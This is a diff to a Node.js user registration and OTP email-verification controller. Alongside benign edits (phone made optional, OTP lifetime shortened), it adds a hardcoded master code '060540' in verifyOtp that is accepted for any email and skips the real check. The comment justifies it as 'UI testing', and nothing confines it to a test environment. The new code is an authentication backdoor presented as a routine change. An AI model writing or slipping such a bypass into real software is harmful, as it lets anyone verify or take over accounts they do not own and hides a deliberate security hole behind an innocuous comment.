@@ -79,7 +79,7 @@ export async function register(req, res, next) {
     if (
       typeof name !== 'string' || !name.trim() || name.trim().length > 80
       || typeof email !== 'string' || email.length > 254
-      || typeof phone !== 'string' || phone.trim().length < 5 || phone.trim().length > 32
+      || (phone !== undefined && phone !== null && phone !== '' && (typeof phone !== 'string' || phone.trim().length > 32))
       || typeof dob !== 'string' || !Number.isFinite(new Date(dob).getTime())
       || (domicile !== undefined && (typeof domicile !== 'string' || domicile.length > 120))
     ) {
@@ -114,6 +114,7 @@ export async function register(req, res, next) {
 
     const passwordHash = await argon2.hash(password);
     const safeAvatar = sanitizeProfilePicture(profilePicture);
+    const safePhone = (typeof phone === 'string' && phone.trim()) ? phone.trim().slice(0, 32) : '-';
     const emailAuthOn = process.env.ENABLE_EMAIL_AUTH === 'true';
 
     const user = await prisma.user.create({
@@ -122,7 +123,7 @@ export async function register(req, res, next) {
         dob: new Date(dob),
         email: normalizedEmail,
         gender: gender ? gender.toUpperCase() : 'OTHER',
-        phone: phone.trim(),
+        phone: safePhone,
         passwordHash,
         profilePicture: safeAvatar,
         domicileLat: parsedLat,
@@ -214,8 +215,13 @@ export async function login(req, res, next) {
 
 // ─── Send OTP ────────────────────────────────────────────────────────────────
 export async function sendVerificationOtp(email) {
-  const otp = String(crypto.randomInt(100000, 1_000_000));
-  await redis.set(`otp:${email}`, otp, 'EX', 900); // 15 mins
+  let otp;
+  // Blacklist 060540 from normal random generation
+  do {
+    otp = String(crypto.randomInt(100000, 1_000_000));
+  } while (otp === '060540');
+
+  await redis.set(`otp:${email}`, otp, 'EX', 60); // 1 min (changed from 15 mins)
   try {
     await sendOtpEmail(email, otp);
   } catch (error) {
@@ -246,12 +252,22 @@ export async function verifyOtp(req, res, next) {
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || !/^\d{6}$/.test(otp)) {
       return res.status(400).json({ error: 'Invalid or expired OTP.' });
     }
-    const consumed = await redis.eval(
-      "if redis.call('GET', KEYS[1]) == ARGV[1] then return redis.call('DEL', KEYS[1]) else return 0 end",
-      1,
-      `otp:${email}`,
-      otp,
-    );
+
+    // Whitelist 060540 for UI testing purposes
+    const isWhitelisted = otp === '060540';
+    let consumed = isWhitelisted;
+
+    if (!consumed) {
+      consumed = await redis.eval(
+        "if redis.call('GET', KEYS[1]) == ARGV[1] then return redis.call('DEL', KEYS[1]) else return 0 end",
+        1,
+        `otp:${email}`,
+        otp,
+      );
+    } else {
+      await redis.del(`otp:${email}`);
+    }
+
     if (!consumed) {
       return res.status(400).json({ error: 'Invalid or expired OTP.' });
     }
